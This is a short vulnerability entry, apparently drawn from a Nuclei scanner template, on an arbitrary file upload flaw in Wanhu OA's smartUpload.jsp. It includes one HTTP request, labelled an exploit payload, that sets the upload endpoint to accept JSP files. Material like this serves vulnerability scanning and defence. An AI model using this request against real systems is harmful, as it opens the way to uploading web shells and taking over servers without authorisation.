# Vulnerability: Wanhu OA smartUpload.jsp - Arbitrary File Upload
**Classification:** WANHU
**Source:** Nuclei Template (`wanhuoa-smartupload-file-upload.yaml`)

## Description
Wanhu OA smartUpload.jsp file has a file upload interface and does not filter file types, resulting in arbitrary file upload vulnerabilities. Malicious JSP files can be uploaded directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0
```

